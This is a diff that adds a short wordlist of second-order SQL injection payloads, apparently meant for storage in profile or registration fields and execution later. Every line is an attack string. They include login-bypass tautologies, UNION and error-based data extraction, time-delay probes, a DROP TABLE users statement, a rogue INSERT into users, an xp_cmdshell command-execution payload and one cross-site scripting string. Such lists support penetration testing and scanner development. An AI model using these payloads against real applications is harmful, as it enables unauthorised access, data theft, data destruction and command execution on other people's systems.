@@ -1,0 +1,22 @@
+# Second-Order SQL Injection Payloads
+# These are stored (e.g. in profile/registration) then executed later
+' OR 1=1--
+admin'--
+'+(SELECT 1)+'
+' UNION SELECT 1--
+\' OR \'1\'=\'1
+1'; WAITFOR DELAY '0:0:5'--
+'; SELECT SLEEP(5)--
+test' OR '1'='1
+test'; DROP TABLE users--
+test' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+<script>alert(1)</script>' OR '1'='1
+' AND 1=2 UNION SELECT user(),2--
+admin') OR ('1'='1
+' AND 1=1--
+name' AND SLEEP(5)--
+user@test.com' OR 1=1--
+'); SELECT SLEEP(5)--
+' OR username='admin'--
+test'; INSERT INTO users VALUES('x','x')--
+a'; EXEC xp_cmdshell('whoami')--
